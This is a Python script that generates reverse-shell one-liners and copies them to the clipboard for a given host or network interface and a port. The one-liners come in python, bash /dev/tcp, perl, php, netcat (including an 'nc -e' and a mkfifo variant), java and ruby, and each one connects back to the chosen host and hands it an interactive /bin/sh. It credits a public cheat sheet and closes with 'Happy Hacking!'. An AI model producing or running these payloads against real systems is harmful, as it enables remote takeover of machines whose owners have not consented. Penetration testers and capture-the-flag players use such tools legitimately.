#!/usr/bin/env python3

# The oneliner codes are provided by PentestMonkey (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
# The code to retrieve the IP address from the network interface was provided by Martin Konecny & Oleh Prypin
# at https://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
#
# Module dependencies
# Run pip3 install netifaces
#
# 
# Usage: python3 oneliner.py -i eth0 -p 1337 -l py

import argparse, netifaces as ni, pyperclip, re, sys

def get_args():
	parser = argparse.ArgumentParser(usage="Usage: oneliner.py -l <localhost> -p <port> -s <script_type>")
	parser.add_argument("-i", "--host", dest="host", help="Enter the IP address or network interface that the reverse shell will connect back to")
	parser.add_argument("-p", "--port", dest="port", help="Enter the port number that you're listening on")
	parser.add_argument("-l", "--lanugage", dest="lang", help="Enter the language type you'd like the one liner for(python, bash, perl, php, ruby, nc, java, ncalt)")
	options = parser.parse_args()
	if not options.host:
		parser.error('[-] Please specify an IP address or network interface, use --help for more information')
	elif not options.port:
		parser.error('[-] Please specify a listening port number, use --help for more information')
	elif not options.lang:
		parser.error('[-] Please specify a language, use --help for more information')
	return options

def get_ip(host):
	# check to see if IP address was used as an argument
	host_type = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", args.host)
	if host_type:
		return args.host
	else: 
		try:
			ni.ifaddresses(args.host)
			return ni.ifaddresses(args.host)[ni.AF_INET][0]['addr']
		except ValueError:
			print('[-] Please specify a valid interface name or IP address')
			sys.exit()

args = get_args()
host = get_ip(args.host)
lang = args.lang
port = args.port

# ensure a valid port number was provided
try:
	if int(port) < 0 or int(port) > 65535:
		print('[-] Please specify a valid port number.')
		sys.exit()
except ValueError:
	print('[-] Port number must be in base 10 integer format')
	sys.exit()

if lang == 'python' or lang == 'py':
	pyperclip.copy("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + host + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
elif lang == 'bash' or lang == 'sh':
	pyperclip.copy("bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1")
elif lang == 'perl':
	pyperclip.copy("perl -e 'use Socket;$i=\"" + host + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
elif lang == 'php' or lang == 'worst_language_ever':
	pyperclip.copy("php -r '$sock=fsockopen(\"" + host + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
elif lang == 'nc' or lang == 'netcat':
	pyperclip.copy("nc -e /bin/sh " + host + " " + port)
elif lang == 'ncalt':
	pyperclip.copy("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + host + " " + port + " >/tmp/f")
elif lang == 'java' or lang == 'not_javascript':
	pyperclip.copy("r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + host + "/" + port + ";cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])p.waitFor()")
elif lang == 'ruby':
	pyperclip.copy("ruby -rsocket -e'f=TCPSocket.open(\"" + host + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
else:
	print('[-] Invalid language selected!')
	sys.exit()

print('[+] Reverse Shell code has been copied to your clipboard. Happy Hacking!')
